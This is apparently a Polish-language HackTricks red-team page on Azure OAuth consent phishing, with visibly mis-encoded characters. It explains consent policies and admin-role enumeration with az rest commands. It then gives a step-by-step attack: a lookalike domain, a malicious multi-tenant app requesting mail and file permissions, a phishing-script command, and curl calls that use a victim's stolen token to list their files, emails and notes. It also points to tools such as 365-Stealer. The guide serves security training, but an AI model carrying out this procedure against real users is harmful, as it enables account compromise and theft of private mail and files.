# Az - OAuth Apps Phishing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## OAuth App Phishing

**Aplikacje Azure** sÄ… konfigurowane z uprawnieniami, ktÃ³re bÄ™dÄ… mogÅ‚y byÄ‡ uÅ¼ywane, gdy uÅ¼ytkownik wyrazi zgodÄ™ na aplikacjÄ™ (takimi jak enumerowanie katalogu, dostÄ™p do plikÃ³w lub wykonywanie innych dziaÅ‚aÅ„). NaleÅ¼y pamiÄ™taÄ‡, Å¼e aplikacja bÄ™dzie dziaÅ‚aÄ‡ w imieniu uÅ¼ytkownika, wiÄ™c nawet jeÅ›li aplikacja moÅ¼e prosiÄ‡ o uprawnienia administracyjne, jeÅ›li **uÅ¼ytkownik, ktÃ³ry wyraÅ¼a zgodÄ™, nie ma tych uprawnieÅ„**, aplikacja **nie bÄ™dzie mogÅ‚a wykonywaÄ‡ dziaÅ‚aÅ„ administracyjnych**.

### Uprawnienia zgody aplikacji

DomyÅ›lnie kaÅ¼dy **uÅ¼ytkownik moÅ¼e wyraziÄ‡ zgodÄ™ na aplikacje**, chociaÅ¼ moÅ¼na to skonfigurowaÄ‡ tak, aby uÅ¼ytkownicy mogli wyraÅ¼aÄ‡ zgodÄ™ tylko na **aplikacje od zweryfikowanych wydawcÃ³w dla wybranych uprawnieÅ„** lub nawet **usunÄ…Ä‡ uprawnienie** dla uÅ¼ytkownikÃ³w do wyraÅ¼ania zgody na aplikacje.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

JeÅ›li uÅ¼ytkownicy nie mogÄ… wyraziÄ‡ zgody, **administratorzy** tacy jak `GA`, `Administrator aplikacji` lub `Administrator aplikacji w chmurze` mogÄ… **wyraziÄ‡ zgodÄ™ na aplikacje**, ktÃ³re uÅ¼ytkownicy bÄ™dÄ… mogli uÅ¼ywaÄ‡.

Co wiÄ™cej, jeÅ›li uÅ¼ytkownicy mogÄ… wyraÅ¼aÄ‡ zgodÄ™ tylko na aplikacje uÅ¼ywajÄ…ce **niskiego ryzyka** uprawnieÅ„, te uprawnienia to domyÅ›lnie **openid**, **profil**, **email**, **User.Read** i **offline\_access**, chociaÅ¼ moÅ¼liwe jest **dodanie wiÄ™cej** do tej listy.

A jeÅ›li mogÄ… wyraÅ¼aÄ‡ zgodÄ™ na wszystkie aplikacje, mogÄ… wyraÅ¼aÄ‡ zgodÄ™ na wszystkie aplikacje.

### 2 Typy atakÃ³w

* **Nieautoryzowany**: Z zewnÄ™trznego konta utwÃ³rz aplikacjÄ™ z **niskim ryzykiem uprawnieÅ„** `User.Read` i `User.ReadBasic.All`, na przykÅ‚ad, phishinguj uÅ¼ytkownika, a bÄ™dziesz mÃ³gÅ‚ uzyskaÄ‡ dostÄ™p do informacji katalogowych.
* To wymaga, aby phished uÅ¼ytkownik byÅ‚ **w stanie zaakceptowaÄ‡ aplikacje OAuth z zewnÄ™trznego najemcy**.
* JeÅ›li phished uÅ¼ytkownik jest jakimÅ› administratorem, ktÃ³ry moÅ¼e **wyraÅ¼aÄ‡ zgodÄ™ na kaÅ¼dÄ… aplikacjÄ™ z dowolnymi uprawnieniami**, aplikacja moÅ¼e rÃ³wnieÅ¼ **Å¼Ä…daÄ‡ uprawnieÅ„ uprzywilejowanych**.
* **Autoryzowany**: Po skompromitowaniu podmiotu z wystarczajÄ…cymi uprawnieniami, **utwÃ³rz aplikacjÄ™ wewnÄ…trz konta** i **phishinguj** jakiegoÅ› **uprzywilejowanego** uÅ¼ytkownika, ktÃ³ry moÅ¼e zaakceptowaÄ‡ uprzywilejowane uprawnienia OAuth.
* W tym przypadku moÅ¼esz juÅ¼ uzyskaÄ‡ dostÄ™p do informacji katalogowych, wiÄ™c uprawnienie `User.ReadBasic.All` nie jest juÅ¼ interesujÄ…ce.
* Prawdopodobnie interesujÄ… ciÄ™ **uprawnienia, ktÃ³re wymagajÄ…, aby administrator je przyznaÅ‚**, poniewaÅ¼ zwykÅ‚y uÅ¼ytkownik nie moÅ¼e przyznaÄ‡ aplikacjom OAuth Å¼adnych uprawnieÅ„, dlatego musisz **phishingowaÄ‡ tylko tych uÅ¼ytkownikÃ³w** (wiÄ™cej na temat rÃ³l/uprawnieÅ„, ktÃ³re przyznajÄ… to uprawnienie pÃ³Åºniej).

### UÅ¼ytkownicy mogÄ… wyraÅ¼aÄ‡ zgodÄ™

ZauwaÅ¼, Å¼e musisz wykonaÄ‡ to polecenie z konta uÅ¼ytkownika wewnÄ…trz najemcy, nie moÅ¼esz znaleÅºÄ‡ tej konfiguracji najemcy z zewnÄ™trznego. NastÄ™pujÄ…ce cli mogÄ… pomÃ³c ci zrozumieÄ‡ uprawnienia uÅ¼ytkownikÃ³w:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
```
{% endcode %}

* UÅ¼ytkownicy mogÄ… wyraÅ¼aÄ‡ zgodÄ™ na wszystkie aplikacje: JeÅ›li w **`permissionGrantPoliciesAssigned`** znajdziesz: `ManagePermissionGrantsForSelf.microsoft-user-default-legacy`, to uÅ¼ytkownicy mogÄ… akceptowaÄ‡ kaÅ¼dÄ… aplikacjÄ™.
* UÅ¼ytkownicy mogÄ… wyraÅ¼aÄ‡ zgodÄ™ na aplikacje od zweryfikowanych wydawcÃ³w lub twojej organizacji, ale tylko na uprawnienia, ktÃ³re wybierzesz: JeÅ›li w **`permissionGrantPoliciesAssigned`** znajdziesz: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team`, to uÅ¼ytkownicy mogÄ… akceptowaÄ‡ kaÅ¼dÄ… aplikacjÄ™.
* **WyÅ‚Ä…cz zgodÄ™ uÅ¼ytkownika**: JeÅ›li w **`permissionGrantPoliciesAssigned`** znajdziesz tylko: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-chat` i `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team`, to uÅ¼ytkownicy nie mogÄ… wyraÅ¼aÄ‡ zgody na Å¼adne.

MoÅ¼liwe jest znalezienie znaczenia kaÅ¼dej z komentowanych polityk w:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/permissionGrantPolicies"
```
{% endcode %}

### **Administratorzy aplikacji**

SprawdÅº uÅ¼ytkownikÃ³w, ktÃ³rzy sÄ… uwaÅ¼ani za administratorÃ³w aplikacji (mogÄ… akceptowaÄ‡ nowe aplikacje):

{% code overflow="wrap" %}
```bash
# Get list of roles
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"

# Get Global Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1b2256f9-46c1-4fc2-a125-5b2f51bb43b7/members"

# Get Application Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1e92c3b7-2363-4826-93a6-7f7a5b53e7f9/members"

# Get Cloud Applications Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/0d601d27-7b9c-476f-8134-8e7cd6744f02/members"
```
{% endcode %}

## **PrzeglÄ…d PrzepÅ‚ywu Ataku**

Atak obejmuje kilka krokÃ³w, ktÃ³re majÄ… na celu atak na ogÃ³lnÄ… firmÄ™. Oto jak moÅ¼e siÄ™ to rozwinÄ…Ä‡:

1. **Rejestracja Domeny i Hosting Aplikacji**: AtakujÄ…cy rejestruje domenÄ™ przypominajÄ…cÄ… zaufanÄ… stronÄ™, na przykÅ‚ad "safedomainlogin.com". Pod tÄ… domenÄ… tworzony jest subdomena (np. "companyname.safedomainlogin.com"), aby hostowaÄ‡ aplikacjÄ™ zaprojektowanÄ… do przechwytywania kodÃ³w autoryzacyjnych i Å¼Ä…dania tokenÃ³w dostÄ™pu.
2. **Rejestracja Aplikacji w Azure AD**: NastÄ™pnie atakujÄ…cy rejestruje aplikacjÄ™ wielo-tenantowÄ… w swoim dzierÅ¼awcy Azure AD, nadajÄ…c jej nazwÄ™ po docelowej firmie, aby wyglÄ…daÅ‚a na legalnÄ…. Konfiguruje URL przekierowania aplikacji, aby wskazywaÅ‚ na subdomenÄ™ hostujÄ…cÄ… zÅ‚oÅ›liwÄ… aplikacjÄ™.
3. **Ustawienie UprawnieÅ„**: AtakujÄ…cy ustawia aplikacjÄ™ z rÃ³Å¼nymi uprawnieniami API (np. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Te uprawnienia, po przyznaniu przez uÅ¼ytkownika, pozwalajÄ… atakujÄ…cemu na wydobycie wraÅ¼liwych informacji w imieniu uÅ¼ytkownika.
4. **Dystrybucja ZÅ‚oÅ›liwych LinkÃ³w**: AtakujÄ…cy tworzy link zawierajÄ…cy identyfikator klienta zÅ‚oÅ›liwej aplikacji i dzieli siÄ™ nim z docelowymi uÅ¼ytkownikami, oszukujÄ…c ich, aby przyznali zgodÄ™.

## PrzykÅ‚ad Ataku

1. Zarejestruj **nowÄ… aplikacjÄ™**. MoÅ¼e byÄ‡ tylko dla bieÅ¼Ä…cego katalogu, jeÅ›li uÅ¼ywasz uÅ¼ytkownika z zaatakowanego katalogu lub dla dowolnego katalogu, jeÅ›li jest to atak zewnÄ™trzny (jak na poniÅ¼szym obrazku).
1. Ustaw rÃ³wnieÅ¼ **URI przekierowania** na oczekiwanÄ… URL, gdzie chcesz otrzymaÄ‡ kod do uzyskania tokenÃ³w (`http://localhost:8000/callback` domyÅ›lnie).

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

2. NastÄ™pnie utwÃ³rz tajny klucz aplikacji:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

3. Wybierz uprawnienia API (np. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

4. **Wykonaj stronÄ™ internetowÄ… (**[**azure\_oauth\_phishing\_example**](https://github.com/carlospolop/azure_oauth_phishing_example)**)**, ktÃ³ra prosi o uprawnienia:

{% code overflow="wrap" %}
```bash
# From https://github.com/carlospolop/azure_oauth_phishing_example
python3 azure_oauth_phishing_example.py --client-secret <client-secret> --client-id <client-id> --scopes "email,Files.ReadWrite.All,Mail.Read,Notes.Read.All,offline_access,openid,profile,User.Read"
```
{% endcode %}

5. **WyÅ›lij URL do ofiary**
1. W tym przypadku `http://localhost:8000`
6. **Ofiary** muszÄ… **zaakceptowaÄ‡ monit:**

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

7. UÅ¼yj **tokena dostÄ™pu, aby uzyskaÄ‡ Å¼Ä…dane uprawnienia**:
```bash
export ACCESS_TOKEN=<ACCESS_TOKEN>

# List drive files
curl -X GET \
https://graph.microsoft.com/v1.0/me/drive/root/children \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List eails
curl -X GET \
https://graph.microsoft.com/v1.0/me/messages \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List notes
curl -X GET \
https://graph.microsoft.com/v1.0/me/onenote/notebooks \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"
```
## Inne narzÄ™dzia

* [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)**:** SprawdÅº [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer), aby dowiedzieÄ‡ siÄ™, jak go skonfigurowaÄ‡.
* [**O365-Attack-Toolkit**](https://github.com/mdsecactivebreach/o365-attack-toolkit)

## Post-eksploatacja

### Phishing po eksploatacji

W zaleÅ¼noÅ›ci od Å¼Ä…danych uprawnieÅ„ moÅ¼esz byÄ‡ w stanie **uzyskaÄ‡ dostÄ™p do rÃ³Å¼nych danych najemcy** (lista uÅ¼ytkownikÃ³w, grup... lub nawet modyfikowaÄ‡ ustawienia) oraz **informacji o uÅ¼ytkowniku** (pliki, notatki, e-maile...). NastÄ™pnie moÅ¼esz wykorzystaÄ‡ te uprawnienia do wykonania tych dziaÅ‚aÅ„.

### Aplikacja po eksploatacji

SprawdÅº sekcje Aplikacje i GÅ‚Ã³wne zasady usÅ‚ugi na stronie:

{% content-ref url="../az-privilege-escalation/az-entraid-privesc/" %}
[az-entraid-privesc](../az-privilege-escalation/az-entraid-privesc/)
{% endcontent-ref %}

## Odniesienia

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
